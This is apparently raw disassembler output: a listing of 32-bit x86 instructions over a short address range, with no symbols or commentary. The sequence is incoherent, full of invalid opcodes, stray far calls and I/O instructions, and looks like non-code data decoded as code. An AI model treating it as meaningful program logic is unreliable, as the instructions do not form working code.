  413728:	85 87 b7 45 0c 6c    	test   %eax,0x6c0c45b7(%edi)
  41372e:	55                   	push   %ebp
  41372f:	0f ab c8             	bts    %ecx,%eax
  413732:	a8 04                	test   $0x4,%al
  413734:	78 01                	js     0x413737
  413736:	6e                   	outsb  %ds:(%esi),(%dx)
  413737:	5b                   	pop    %ebx
  413738:	7e 0d                	jle    0x413747
  41373a:	cb                   	lret
  41373b:	c7                   	(bad)
  41373c:	8b ce                	mov    %esi,%ecx
  41373e:	cd 78                	int    $0x78
  413740:	09 7b 6f             	or     %edi,0x6f(%ebx)
  413743:	33 1b                	xor    (%ebx),%ebx
  413745:	01 25 1f 60 0b 2f    	add    %esp,0x2f0b601f
  41374b:	d6                   	salc
  41374c:	97                   	xchg   %eax,%edi
  41374d:	21 15 e0 07 45 8d    	and    %edx,0x8d4507e0
  413753:	4e                   	dec    %esi
  413754:	70 6e                	jo     0x4137c4
  413756:	7f 5b                	jg     0x4137b3
  413758:	bf 52 6c 4a b9       	mov    $0xb94a6c52,%edi
  41375d:	88 bd b9 d0 2b 6b    	mov    %bh,0x6b2bd0b9(%ebp)
  413763:	1c 6b                	sbb    $0x6b,%al
  413765:	bc d0 1b 11 21       	mov    $0x21111bd0,%esp
  41376a:	52                   	push   %edx
  41376b:	3a 0a                	cmp    (%edx),%cl
  41376d:	cd 3a                	int    $0x3a
  41376f:	4a                   	dec    %edx
  413770:	01 e1                	add    %esp,%ecx
  413772:	04 5e                	add    $0x5e,%al
  413774:	60                   	pusha
  413775:	63 79 02             	arpl   %edi,0x2(%ecx)
  413778:	74 0b                	je     0x413785
  41377a:	03 39                	add    (%ecx),%edi
  41377c:	83 a1 eb e8 42 8f 1d 	andl   $0x1d,-0x70bd1715(%ecx)
  413783:	de df                	(bad)
  413785:	00 89 d1 5a 29 d1    	add    %cl,-0x2ed6a52f(%ecx)
  41378b:	e9 2e 23 2f 2d       	jmp    0x2d705abe
  413790:	52                   	push   %edx
  413791:	66 cd 5d             	data16 int $0x5d
  413794:	d7                   	xlat   %ds:(%ebx)
  413795:	b6 3b                	mov    $0x3b,%dh
  413797:	30 20                	xor    %ah,(%eax)
  413799:	04 2c                	add    $0x2c,%al
  41379b:	17                   	pop    %ss
  41379c:	05 04 74 0e 06       	add    $0x60e7404,%eax
  4137a1:	16                   	push   %ss
  4137a2:	9b                   	fwait
  4137a3:	6d                   	insl   (%dx),%es:(%edi)
  4137a4:	7f 33                	jg     0x4137d9
  4137a6:	08 eb                	or     %ch,%bl
  4137a8:	e4 04                	in     $0x4,%al
  4137aa:	02 02                	add    (%edx),%al
  4137ac:	39 3a                	cmp    %edi,(%edx)
  4137ae:	e2 d9                	loop   0x413789
  4137b0:	27                   	daa
  4137b1:	bb 3b 25 10 8a       	mov    $0x8a10253b,%ebx
  4137b6:	0a 42 49             	or     0x49(%edx),%al
  4137b9:	90                   	nop
  4137ba:	57                   	push   %edi
  4137bb:	5b                   	pop    %ebx
  4137bc:	5d                   	pop    %ebp
  4137bd:	28 d5                	sub    %dl,%ch
  4137bf:	5c                   	pop    %esp
  4137c0:	0d 50 f2 ae 7d       	or     $0x7daef250,%eax
  4137c5:	f7 30                	divl   (%eax)
  4137c7:	36 7b a3             	ss jnp 0x41376d
  4137ca:	d1 89 c1 58 5f 18    	rorl   $1,0x185f58c1(%ecx)
  4137d0:	5f                   	pop    %edi
  4137d1:	05 35 fa 5a b6       	add    $0xb65afa35,%eax
  4137d6:	a1 fc 37 b1 03       	mov    0x3b137fc,%eax
  4137db:	19 02                	sbb    %eax,(%edx)
  4137dd:	2e e8 4a 43 19 3f    	cs call 0x3f5a7b2d
  4137e3:	9b                   	fwait
  4137e4:	cc                   	int3
  4137e5:	4b                   	dec    %ebx
  4137e6:	3d 08 e5 e2 fd       	cmp    $0xfde2e508,%eax
  4137eb:	89 8b 79 fc b7 fc    	mov    %ecx,-0x3480387(%ebx)
  4137f1:	cb                   	lret
  4137f2:	0d ad c5 01 fa       	or     $0xfa01c5ad,%eax
  4137f7:	ce                   	into
  4137f8:	8a 0d 29 1c 89 4e    	mov    0x4e891c29,%cl
  4137fe:	b1 17                	mov    $0x17,%cl
  413800:	a1 6d 12 13 11       	mov    0x1113126d,%eax
  413805:	8e f4                	mov    %esp,%?
  413807:	16                   	push   %ss
  413808:	be af 15 1a f6       	mov    $0xf61a15af,%esi
  41380d:	aa                   	stos   %al,%es:(%edi)
  41380e:	cf                   	iret
  41380f:	43                   	inc    %ebx
  413810:	61                   	popa
  413811:	41                   	inc    %ecx
  413812:	a0 58 b4 4b 6c       	mov    0x6c4bb458,%al
  413817:	3b 10                	cmp    (%eax),%edx
  413819:	02 3b                	add    (%ebx),%bh
  41381b:	08 bb e7 4b ff 7e    	or     %bh,0x7eff4be7(%ebx)
  413821:	f5                   	cmc
  413822:	24 4c                	and    $0x4c,%al
  413824:	5a                   	pop    %edx
  413825:	10 26                	adc    %ah,(%esi)
  413827:	5c                   	pop    %esp
  413828:	57                   	push   %edi
  413829:	d3 89 ce 50 5e fc    	rorl   %cl,-0x3a1af32(%ecx)
  41382f:	4a                   	dec    %edx
  413830:	35 0c c6 03 46       	xor    $0x4603c60c,%eax
  413835:	74 c7                	je     0x4137fe
  413837:	de d8                	(bad)
  413839:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  41383a:	ed                   	in     (%dx),%eax
  41383b:	ec                   	in     (%dx),%al
  41383c:	d8 33                	fdivs  (%ebx)
  41383e:	76 89                	jbe    0x4137c9
  413840:	fa                   	cli
  413841:	62 03                	bound  %eax,(%ebx)
  413843:	53                   	push   %ebx
  413844:	0e                   	push   %cs
  413845:	58                   	pop    %eax
  413846:	0f bf d8             	movswl %ax,%ebx
  413849:	25 53 63 71 4f       	and    $0x4f716353,%eax
  41384e:	f8                   	clc
  41384f:	45                   	inc    %ebp
  413850:	70 89                	jo     0x4137db
  413852:	ca 6b bb             	lret   $0xbb6b
  413855:	22 bf e9 50 89 ca    	and    -0x3576af17(%edi),%bh
  41385b:	53                   	push   %ebx
  41385c:	52                   	push   %edx
  41385d:	50                   	push   %eax
  41385e:	52                   	push   %edx
  41385f:	ec                   	in     (%dx),%al
  413860:	f5                   	cmc
  413861:	86 b8 41 6a 94 10    	xchg   %bh,0x10946a41(%eax)
  413867:	02 03                	add    (%ebx),%al
  413869:	41                   	inc    %ecx
  41386a:	fc                   	cld
  41386b:	4a                   	dec    %edx
  41386c:	1b ec                	sbb    %esp,%ebp
  41386e:	6a ac                	push   $0xffffffac
  413870:	ce                   	into
  413871:	59                   	pop    %ecx
  413872:	50                   	push   %eax
  413873:	77 44                	ja     0x4138b9
  413875:	9c                   	pushf
  413876:	78 f2                	js     0x41386a
  413878:	20 b6 c3 10 8b d7    	and    %dh,-0x2874ef3d(%esi)
  41387e:	01 ce                	add    %ecx,%esi
  413880:	53                   	push   %ebx
  413881:	39 d9                	cmp    %ebx,%ecx
  413883:	5c                   	pop    %esp
  413884:	5b                   	pop    %ebx
  413885:	11 e9                	adc    %ebp,%ecx
  413887:	8d aa 55 4a 5a c5    	lea    -0x3aa5b5ab(%edx),%ebp
  41388d:	82 11 7e             	adcb   $0x7e,(%ecx)
  413890:	58                   	pop    %eax
  413891:	8d 24 94             	lea    (%esp,%edx,4),%esp
  413894:	ff 83 53 b8 d7 61    	incl   0x61d7b853(%ebx)
  41389a:	d8 4a f4             	fmuls  -0xc(%edx)
  41389d:	c6                   	(bad)
  41389e:	8f ca 7e 68          	(bad)
  4138a2:	81 bf c0 ad 40 6b 57 	cmpl   $0xfc57f657,0x6b40adc0(%edi)
  4138a9:	f6 57 fc 
  4138ac:	13 77 02             	adc    0x2(%edi),%esi
  4138af:	01 c2                	add    %eax,%edx
  4138b1:	52                   	push   %edx
  4138b2:	f6 5f e2             	negb   -0x1e(%edi)
  4138b5:	c2 c1 ea             	ret    $0xeac1
  4138b8:	9a 26 8b 13 1f 39 d9 	lcall  $0xd939,$0x1f138b26
  4138bf:	75 58                	jne    0x413919
  4138c1:	4a                   	dec    %edx
  4138c2:	74 15                	je     0x4138d9
  4138c4:	b0 95                	mov    $0x95,%al
  4138c6:	81 ce d0 04 47 0c    	or     $0xc4704d0,%esi
  4138cc:	4b                   	dec    %ebx
  4138cd:	8e 97 ad c4 b6 0b    	mov    0xbb6c4ad(%edi),%ss
  4138d3:	08 80 e2 97 0a 04    	or     %al,0x40a97e2(%eax)
  4138d9:	04 5a                	add    $0x5a,%al
  4138db:	59                   	pop    %ecx
  4138dc:	be 85 02 3d ee       	mov    $0xee3d0285,%esi
  4138e1:	22 2b                	and    (%ebx),%ch
  4138e3:	38 41 40             	cmp    %al,0x40(%ecx)
  4138e6:	09 d8                	or     %ebx,%eax
  4138e8:	7e 17                	jle    0x413901
  4138ea:	38 fd                	cmp    %bh,%ch
  4138ec:	75 3a                	jne    0x413928
  4138ee:	06                   	push   %es
  4138ef:	10 45 bb             	adc    %al,-0x45(%ebp)
  4138f2:	55                   	push   %ebp
  4138f3:	f7 6e 2a             	imull  0x2a(%esi)
  4138f6:	81 e1 05 38 27 2e    	and    $0x2e273805,%ecx
  4138fc:	eb 23                	jmp    0x413921
  4138fe:	60                   	pusha
  4138ff:	eb 76                	jmp    0x413977
  413901:	ae                   	scas   %es:(%edi),%al
  413902:	15 c9 6a 06 15       	adc    $0x15066ac9,%eax
  413907:	5a                   	pop    %edx
  413908:	30 10                	xor    %dl,(%eax)
  41390a:	2d aa 74 df aa       	sub    $0xaadf74aa,%eax
  41390f:	0c cf                	or     $0xcf,%al
  413911:	10 c1                	adc    %al,%cl
  413913:	eb 10                	jmp    0x413925
  413915:	0d 02 70 81 12       	or     $0x12817002,%eax
  41391a:	c9                   	leave
  41391b:	97                   	xchg   %eax,%edi
  41391c:	0f 02 11             	lar    (%ecx),%edx
  41391f:	38 c2                	cmp    %al,%dl
  413921:	76 9e                	jbe    0x4138c1
  413923:	0c 89                	or     $0x89,%al
  413925:	75 2c                	jne    0x413953
  413927:	92                   	xchg   %eax,%edx
  413928:	53                   	push   %ebx
  413929:	b3 a6                	mov    $0xa6,%bl
  41392b:	d6                   	salc
  41392c:	b0 a4                	mov    $0xa4,%al
  41392e:	ca 93 13             	lret   $0x1393
  413931:	f4                   	hlt
  413932:	8c 2c 0c             	mov    %gs,(%esp,%ecx,1)
  413935:	a9 95 04 06 d6       	test   $0xd6060495,%eax
  41393a:	bb 5b 01 de bd       	mov    $0xbdde015b,%ebx
  41393f:	12 fe                	adc    %dh,%bh
  413941:	e7 44                	out    %eax,$0x44
  413943:	2d 8b 58 fc 12       	sub    $0x12fc588b,%eax
  413948:	45                   	inc    %ebp
  413949:	bb f0 7f 26 4a       	mov    $0x4a267ff0,%ebx
  41394e:	7c 1b                	jl     0x41396b
  413950:	39 da                	cmp    %ebx,%edx
  413952:	7d 1f                	jge    0x413973
  413954:	29 d3                	sub    %edx,%ebx
  413956:	40                   	inc    %eax
  413957:	7c 19                	jl     0x413972
  413959:	8d 4e 72             	lea    0x72(%esi),%ecx
  41395c:	04 ad                	add    $0xad,%al
  41395e:	9a e3 8d 14 11 34 bb 	lcall  $0xbb34,$0x11148de3
  413965:	d5 0d                	aad    $0xd
  413967:	28 eb                	sub    %ch,%bl
  413969:	e5 7a                	in     $0x7a,%eax
  41396b:	eb eb                	jmp    0x413958
  41396d:	12 bb 24 75 d1 5b    	adc    0x5bd17524(%ebx),%bh
  413973:	5b                   	pop    %ebx
  413974:	5e                   	pop    %esi
  413975:	c3                   	ret
  413976:	ab                   	stos   %eax,%es:(%edi)
  413977:	12 28                	adc    (%eax),%ch
  413979:	14 b8                	adc    $0xb8,%al
  41397b:	71 c7                	jno    0x413944
  41397d:	58                   	pop    %eax
  41397e:	77 30                	ja     0x4139b0
  413980:	59                   	pop    %ecx
  413981:	4e                   	dec    %esi
  413982:	7c 2a                	jl     0x4139ae
  413984:	2c 7d                	sub    $0x7d,%al
  413986:	26 60                	es pusha
  413988:	ff f6                	push   %esi
  41398a:	5f                   	pop    %edi
  41398b:	32 7e 22             	xor    0x22(%esi),%bh
  41398e:	29 f1                	sub    %esi,%ecx
  413990:	39 cf                	cmp    %ecx,%edi
  413992:	7e 02                	jle    0x413996
  413994:	20 29                	and    %ch,(%ecx)
  413996:	f9                   	stc
  413997:	01 f2                	add    %esi,%edx
  413999:	8d 04 3a             	lea    (%edx,%edi,1),%eax
  41399c:	7e 77                	jle    0x413a15
  41399e:	7e b4                	jle    0x413954
  4139a0:	86 ea                	xchg   %ch,%dl
  4139a2:	52                   	push   %edx
  4139a3:	df 3f                	fistpll (%edi)
  4139a5:	29 1c 86             	sub    %ebx,(%esi,%eax,4)
  4139a8:	3b 3e                	cmp    (%esi),%edi
  4139aa:	08 5d 40             	or     %bl,0x40(%ebp)
  4139ad:	3b 31                	cmp    (%ecx),%esi
  4139af:	77 8b                	ja     0x41393c
  4139b1:	4f                   	dec    %edi
  4139b2:	fc                   	cld
  4139b3:	57                   	push   %edi
  4139b4:	72 4a                	jb     0x413a00
  4139b6:	78 dd                	js     0x413995
  4139b8:	51                   	push   %ecx
  4139b9:	a2 f1 1b 8a 06       	mov    %al,0x68a1bf1
  4139be:	46                   	inc    %esi
  4139bf:	e0 5b                	loopne 0x413a1c
  4139c1:	c4 10                	les    (%eax),%edx
  4139c3:	89 cb                	mov    %ecx,%ebx
  4139c5:	44                   	inc    %esp
  4139c6:	d7                   	xlat   %ds:(%ebx)
  4139c7:	aa                   	stos   %al,%es:(%edi)
  4139c8:	dd 1c d1             	fstpl  (%ecx,%edx,8)
  4139cb:	f3 a6                	repz cmpsb %es:(%edi),%ds:(%esi)
  4139cd:	2f                   	das
  4139ce:	17                   	pop    %ss
  4139cf:	89 ec                	mov    %ebp,%esp
  4139d1:	c2 96 6b             	ret    $0x6b96
  4139d4:	a1 db 2d 08 30       	mov    0x30082ddb,%eax
  4139d9:	43                   	inc    %ebx
  4139da:	f8                   	clc
  4139db:	29 ba 5f 32 82 5b    	sub    %edi,0x5b82325f(%edx)
  4139e1:	8f                   	(bad)
  4139e2:	31 ff                	xor    %edi,%edi
  4139e4:	4c                   	dec    %esp
  4139e5:	48                   	dec    %eax
  4139e6:	14 ba                	adc    $0xba,%al
  4139e8:	75 d7                	jne    0x4139c1
  4139ea:	fb                   	sti
  4139eb:	56                   	push   %esi
  4139ec:	23 83 78 5e 75 1d    	and    0x1d755e78(%ebx),%eax
  4139f2:	4e                   	dec    %esi
  4139f3:	5d                   	pop    %ebp
  4139f4:	bf 36 2e 92 c2       	mov    $0xc2922e36,%edi
  4139f9:	09 0b                	or     %ecx,(%ebx)
  4139fb:	e0 79                	loopne 0x413a76
  4139fd:	c4 58 7a             	les    0x7a(%eax),%ebx
  413a00:	89 e1                	mov    %esp,%ecx
  413a02:	02 85 0b 19 70 fc    	add    -0x38fe6f5(%ebp),%al
  413a08:	9d                   	popf
  413a09:	6b eb 28             	imul   $0x28,%ebx,%ebp
  413a0c:	0b c3                	or     %ebx,%eax
  413a0e:	16                   	push   %ss
  413a0f:	0b 46 83             	or     -0x7d(%esi),%eax
  413a12:	31 68 fa             	xor    %ebp,-0x6(%eax)
  413a15:	27                   	daa
  413a16:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  413a17:	01 d6                	add    %edx,%esi
  413a19:	76 39                	jbe    0x413a54
  413a1b:	f1                   	int1
  413a1c:	7c b5                	jl     0x4139d3
  413a1e:	f1                   	int1
  413a1f:	6f                   	outsl  %ds:(%esi),(%dx)
  413a20:	3f                   	aas
  413a21:	34 75                	xor    $0x75,%al
  413a23:	94                   	xchg   %eax,%esp
  413a24:	1d 73 29 88 c3       	sbb    $0xc3882973,%eax
  413a29:	ca 4c db             	lret   $0xdb4c
  413a2c:	ec                   	in     (%dx),%al
  413a2d:	fe c7                	inc    %bh
  413a2f:	d6                   	salc
  413a30:	4b                   	dec    %ebx
  413a31:	cc                   	int3
  413a32:	ca e2 42             	lret   $0x42e2
  413a35:	b3 59                	mov    $0x59,%bl
  413a37:	89 da                	mov    %ebx,%edx
  413a39:	5b                   	pop    %ebx
  413a3a:	1f                   	pop    %ds
  413a3b:	42                   	inc    %edx
  413a3c:	48                   	dec    %eax
  413a3d:	15 ec de 33 1b       	adc    $0x1b33deec,%eax
  413a42:	8a 5b 3c             	mov    0x3c(%ebx),%bl
  413a45:	81 ec 8d 27 5d cd    	sub    $0xcd5d278d,%esp
  413a4b:	50                   	push   %eax
  413a4c:	49                   	dec    %ecx
  413a4d:	1b ff                	sbb    %edi,%edi
  413a4f:	3f                   	aas
  413a50:	cc                   	int3
  413a51:	e3 0d                	jecxz  0x413a60
  413a53:	c9                   	leave
  413a54:	bf 6b 0d 1c 26       	mov    $0x261c0d6b,%edi
  413a59:	1c 80                	sbb    $0x80,%al
  413a5b:	3c 24                	cmp    $0x24,%al
  413a5d:	ff 75 31             	push   0x31(%ebp)
  413a60:	e2 0e                	loop   0x413a70
  413a62:	74 1a                	je     0x413a7e
  413a64:	6b 5a ad 26          	imul   $0x26,-0x53(%edx),%ebx
  413a68:	6e                   	outsb  %ds:(%esi),(%dx)
  413a69:	87 11                	xchg   %edx,(%ecx)
  413a6b:	bf ee 35 e7 10       	mov    $0x10e735ee,%edi
  413a70:	4c                   	dec    %esp
  413a71:	58                   	pop    %eax
  413a72:	30 74 cf 06          	xor    %dh,0x6(%edi,%ecx,8)
  413a76:	b3 62                	mov    $0x62,%bl
  413a78:	b2 af                	mov    $0xaf,%dl
  413a7a:	01 1e                	add    %ebx,(%esi)
  413a7c:	23 56 63             	and    0x63(%esi),%edx
  413a7f:	70 72                	jo     0x413af3
  413a81:	0e                   	push   %cs
  413a82:	50                   	push   %eax
  413a83:	b2 e8                	mov    $0xe8,%dl
  413a85:	cf                   	iret
  413a86:	9d                   	popf
  413a87:	c1 d8 2c             	rcr    $0x2c,%eax
  413a8a:	8b de                	mov    %esi,%ebx
  413a8c:	0c 17                	or     $0x17,%al
  413a8e:	50                   	push   %eax
  413a8f:	d0 84 31 88 1c 09 e8 	rolb   $1,-0x17f6e378(%ecx,%esi,1)
  413a96:	3b 9b 2d 56 f9 ce    	cmp    -0x3106a9d3(%ebx),%ebx
  413a9c:	bc ff 19 0a b1       	mov    $0xb10a19ff,%esp
  413aa1:	51                   	push   %ecx
  413aa2:	52                   	push   %edx
  413aa3:	bb dc 43 63 26       	mov    $0x266343dc,%ebx
  413aa8:	e0 dd                	loopne 0x413a87
  413aaa:	99                   	cltd
  413aab:	0f 3b                	(bad)
  413aad:	53                   	push   %ebx
  413aae:	8a 2f                	mov    (%edi),%ch
  413ab0:	95                   	xchg   %eax,%ebp
  413ab1:	1e                   	push   %ds
  413ab2:	5a                   	pop    %edx
  413ab3:	c3                   	ret
  413ab4:	64 8d 4c 4d 7c       	lea    %fs:0x7c(%ebp,%ecx,2),%ecx
  413ab9:	0a 06                	or     (%esi),%al
  413abb:	2c 94                	sub    $0x94,%al
  413abd:	02 17                	add    (%edi),%dl
  413abf:	67 98                	addr16 cwtl
  413ac1:	ce                   	into
  413ac2:	12 a1 45 47 13 d0    	adc    -0x2fecb8bb(%ecx),%ah
  413ac8:	3c f9                	cmp    $0xf9,%al
  413aca:	4f                   	dec    %edi
  413acb:	f5                   	cmc
  413acc:	27                   	daa
  413acd:	2f                   	das
  413ace:	34 92                	xor    $0x92,%al
  413ad0:	31 1b                	xor    %ebx,(%ebx)
  413ad2:	3a c5                	cmp    %ch,%al
  413ad4:	8a 56 01             	mov    0x1(%esi),%dl
  413ad7:	56                   	push   %esi
  413ad8:	d8 b6 6e 3b 80 f8    	fdivs  -0x77fc492(%esi)
  413ade:	d2 28                	shrb   %cl,(%eax)
  413ae0:	04 0b                	add    $0xb,%al
  413ae2:	94                   	xchg   %eax,%esp
  413ae3:	09 cb                	or     %ecx,%ebx
  413ae5:	cb                   	lret
  413ae6:	db cf                	fcmovne %st(7),%st
  413ae8:	0c 0d                	or     $0xd,%al
  413aea:	74 36                	je     0x413b22
  413aec:	04 0e                	add    $0xe,%al
  413aee:	74 4f                	je     0x413b3f
  413af0:	0f 74 0f             	pcmpeqb (%edi),%mm1
  413af3:	11 82 08 e4 6e 53    	adc    %eax,0x536ee408(%edx)
  413af9:	b0 02                	mov    $0x2,%al
  413afb:	3c 00                	cmp    $0x0,%al
  413afd:	ed                   	in     (%dx),%eax
  413afe:	6d                   	insl   (%dx),%es:(%edi)
  413aff:	81 66 98 4c c3 45 09 	andl   $0x945c34c,-0x68(%esi)
  413b06:	89 4b 04             	mov    %ecx,0x4(%ebx)
  413b09:	02 46 7f             	add    0x7f(%esi),%al
  413b0c:	d9 96 08 0c 12 10    	fsts   0x10120c08(%esi)
  413b12:	ef                   	out    %eax,(%dx)
  413b13:	eb 32                	jmp    0x413b47
  413b15:	55                   	push   %ebp
  413b16:	89 d5                	mov    %edx,%ebp
  413b18:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  413b19:	c7                   	(bad)
  413b1a:	2e 7d e1             	jge,pn 0x413afe
  413b1d:	2e 0a 32             	or     %cs:(%edx),%dh
  413b20:	03 5c 2e 02          	add    0x2(%esi,%ebp,1),%ebx
  413b24:	f4                   	hlt
  413b25:	2e 06                	cs push %es
  413b27:	7f 2a                	jg     0x413b53
  413b29:	a8 34                	test   $0x34,%al
  413b2b:	73 85                	jae    0x413ab2
  413b2d:	6e                   	outsb  %ds:(%esi),(%dx)
  413b2e:	1c e8                	sbb    $0xe8,%al
  413b30:	5d                   	pop    %ebp
  413b31:	6b 1d 19 4c 0a 96 af 	imul   $0xffffffaf,0x960a4c19,%ebx
  413b38:	f4                   	hlt
  413b39:	15 7c f0 eb 64       	adc    $0x64ebf07c,%eax
  413b3e:	07                   	pop    %es
  413b3f:	de 08                	fimuls (%eax)
  413b41:	98                   	cwtl
  413b42:	e9 29 97 cb 46       	jmp    0x470cd270
  413b47:	af                   	scas   %es:(%edi),%eax
  413b48:	4d                   	dec    %ebp
  413b49:	1e                   	push   %ds
  413b4a:	2c 5c                	sub    $0x5c,%al
  413b4c:	48                   	dec    %eax
  413b4d:	39 74 91 1d          	cmp    %esi,0x1d(%ecx,%edx,4)
  413b51:	16                   	push   %ss
  413b52:	82 a7 dd 36 d5 9e e7 	andb   $0xe7,-0x612ac923(%edi)
  413b59:	79 be                	jns    0x413b19
  413b5b:	d3 31                	shll   %cl,(%ecx)
  413b5d:	46                   	inc    %esi
  413b5e:	58                   	pop    %eax
  413b5f:	62 7b cc             	bound  %edi,-0x34(%ebx)
  413b62:	e6 cc                	out    %al,$0xcc
  413b64:	66 32 88 d7 08 8e 6e 	data16 xor 0x6e8e08d7(%eax),%cl
  413b6b:	db 04 ea             	fildl  (%edx,%ebp,8)
  413b6e:	48                   	dec    %eax
  413b6f:	58                   	pop    %eax
  413b70:	dd 4f 01             	fisttpll 0x1(%edi)
  413b73:	58                   	pop    %eax
  413b74:	7f 0a                	jg     0x413b80
  413b76:	7f 2c                	jg     0x413ba4
  413b78:	74 11                	je     0x413b8b
  413b7a:	cd 10                	int    $0x10
  413b7c:	2c 9e                	sub    $0x9e,%al
  413b7e:	ca 82 1c             	lret   $0x1c82
  413b81:	eb 78                	jmp    0x413bfb
  413b83:	7d 6c                	jge    0x413bf1
  413b85:	7b 67                	jnp    0x413bee
  413b87:	19 07                	sbb    %eax,(%edi)
  413b89:	b7 0d                	mov    $0xd,%bh
  413b8b:	6a 16                	push   $0x16
  413b8d:	2a 34 eb             	sub    (%ebx,%ebp,8),%dh
  413b90:	61                   	popa
  413b91:	40                   	inc    %eax
  413b92:	de 76 ae             	fidivs -0x52(%esi)
  413b95:	13 fa                	adc    %edx,%edi
  413b97:	0b 33                	or     (%ebx),%esi
  413b99:	44                   	inc    %esp
  413b9a:	ff f3                	push   %ebx
  413b9c:	eb 52                	jmp    0x413bf0
  413b9e:	e7 85                	out    %eax,$0x85
  413ba0:	8c bc 2b 74 34 2b 48 	mov    %?,0x482b3474(%ebx,%ebp,1)
  413ba7:	f1                   	int1
  413ba8:	6c                   	insb   (%dx),%es:(%edi)
  413ba9:	be 56 3a 42 04       	mov    $0x4423a56,%esi
  413bae:	3b 64 0f 0a          	cmp    0xa(%edi,%ecx,1),%esp
  413bb2:	6f                   	outsl  %ds:(%esi),(%dx)
  413bb3:	79 d6                	jns    0x413b8b
  413bb5:	6e                   	outsb  %ds:(%esi),(%dx)
  413bb6:	f2 10 35 38 f1 9c 13 	repnz adc %dh,0x139cf138
  413bbd:	14 89                	adc    $0x89,%al
  413bbf:	78 13                	js     0x413bd4
  413bc1:	1f                   	pop    %ds
  413bc2:	49                   	dec    %ecx
  413bc3:	73 18                	jae    0x413bdd
  413bc5:	b8 f0 8f 4c c0       	mov    $0xc04c8ff0,%eax
  413bca:	8a 41 01             	mov    0x1(%ecx),%al
  413bcd:	8d 7c 01 22          	lea    0x22(%ecx,%eax,1),%edi
  413bd1:	6f                   	outsl  %ds:(%esi),(%dx)
  413bd2:	fc                   	cld
  413bd3:	61                   	popa
  413bd4:	fa                   	cli
  413bd5:	85 6f 0b             	test   %ebp,0xb(%edi)
  413bd8:	84 51 03             	test   %dl,0x3(%ecx)
  413bdb:	04 29                	add    $0x29,%al
  413bdd:	c1 7e 95 c2          	sarl   $0xc2,-0x6b(%esi)
  413be1:	01 f0                	add    %esi,%eax
  413be3:	01 da                	add    %ebx,%edx
  413be5:	83 b6 01 4c d1 77 17 	xorl   $0x17,0x77d14c01(%esi)
  413bec:	83 7c f2 f2 f2       	cmpl   $0xfffffff2,-0xe(%edx,%esi,8)
  413bf1:	70 80                	jo     0x413b73
  413bf3:	f9                   	stc
  413bf4:	0e                   	push   %cs
  413bf5:	f9                   	stc
  413bf6:	3d 80 f9 49 80       	cmp    $0x8049f980,%eax
  413bfb:	f9                   	stc
  413bfc:	84 4f f3             	test   %cl,-0xd(%edi)
  413bff:	f2 55                	repnz push %ebp
  413c01:	80 f9 70             	cmp    $0x70,%cl
  413c04:	80 f9 80             	cmp    $0x80,%cl
  413c07:	f9                   	stc
  413c08:	11 17                	adc    %edx,(%edi)
  413c0a:	d8 18                	fcomps (%eax)
  413c0c:	c2 c2 0a             	ret    $0xac2
  413c0f:	5d                   	pop    %ebp
  413c10:	eb df                	jmp    0x413bf1
  413c12:	06                   	push   %es
  413c13:	f6 83 22 50 76 85 7b 	testb  $0x7b,-0x7a89afde(%ebx)
  413c1a:	eb 7d                	jmp    0x413c99
  413c1c:	10 f9                	adc    %bh,%cl
  413c1e:	20 4f 1e             	and    %cl,0x1e(%edi)
  413c21:	2a 58 6c             	sub    0x6c(%eax),%bl
  413c24:	8d 30                	lea    (%eax),%esi
  413c26:	00 b8 10 16 02 43    	add    %bh,0x43021610(%eax)
  413c2c:	e1 5b                	loope  0x413c89
  413c2e:	bd bc 20 02 78       	mov    $0x780220bc,%ebp
  413c33:	58                   	pop    %eax
  413c34:	c3                   	ret
  413c35:	e6 03                	out    %al,$0x3
  413c37:	fd                   	std
  413c38:	4c                   	dec    %esp
  413c39:	c0 09 23             	rorb   $0x23,(%ecx)
  413c3c:	2d 84 d6 da c5       	sub    $0xc5dad684,%eax
  413c41:	b6 b5                	mov    $0xb5,%dh
  413c43:	3b 1f                	cmp    (%edi),%ebx
  413c45:	17                   	pop    %ss
  413c46:	02 51 33             	add    0x33(%ecx),%dl
  413c49:	18 27                	sbb    %ah,(%edi)
  413c4b:	0f 5b 1e             	cvtdq2ps (%esi),%xmm3
  413c4e:	2c 68                	sub    $0x68,%al
  413c50:	22 5a 3b             	and    0x3b(%edx),%bl
  413c53:	7c 11                	jl     0x413c66
  413c55:	02 22                	add    (%edx),%ah
  413c57:	0f 6b 1f             	packssdw (%edi),%mm3
  413c5a:	12 35 74 b8 8e 37    	adc    0x378eb874,%dh
  413c60:	50                   	push   %eax
  413c61:	3f                   	aas
  413c62:	be 4d 0f 85 14       	mov    $0x14850f4d,%esi
  413c67:	f2 59                	repnz pop %ecx
  413c69:	e9 10 b1 b6 05       	jmp    0x5f7ed7e
  413c6e:	9a 03 ea e8 64 ff 8c 	lcall  $0x8cff,$0x64e8ea03
  413c75:	65 33 06             	xor    %gs:(%esi),%eax
  413c78:	8b 6c 24 14          	mov    0x14(%esp),%ebp
  413c7c:	8a 0f                	mov    (%edi),%cl
  413c7e:	f6 32                	divb   (%edx)
  413c80:	f2 3c cf             	repnz cmp $0xcf,%al
  413c83:	43                   	inc    %ebx
  413c84:	52                   	push   %edx
  413c85:	61                   	popa
  413c86:	7d 91                	jge    0x413c19
  413c88:	ac                   	lods   %ds:(%esi),%al
  413c89:	81 85 1c 9c 05 16 f5 	addl   $0x2972bbf5,0x16059c1c(%ebp)
  413c90:	bb 72 29 
  413c93:	43                   	inc    %ebx
  413c94:	87 c2                	xchg   %eax,%edx
  413c96:	04 4d                	add    $0x4d,%al
  413c98:	16                   	push   %ss
  413c99:	2e 6f                	outsl  %cs:(%esi),(%dx)
  413c9b:	3b 9c e4 20 2a 58 eb 	cmp    -0x14a7d5e0(%esp,%eiz,8),%ebx
  413ca2:	7a ad                	jp     0x413c51
  413ca4:	fe                   	(bad)
  413ca5:	d0 3d cb 16 13 10    	sarb   $1,0x101316cb
  413cab:	10 66 e2             	adc    %ah,-0x1e(%esi)
  413cae:	4f                   	dec    %edi
  413caf:	b6 d4                	mov    $0xd4,%dh
  413cb1:	c2 db 98             	ret    $0x98db
  413cb4:	0f 02 1c 93          	lar    (%ebx,%edx,4),%ebx
  413cb8:	08 78 04             	or     %bh,0x4(%eax)
  413cbb:	fd                   	std
  413cbc:	09 67 da             	or     %esp,-0x26(%edi)
  413cbf:	3e 03 1f             	add    %ds:(%edi),%ebx
  413cc2:	03 37                	add    (%edi),%esi
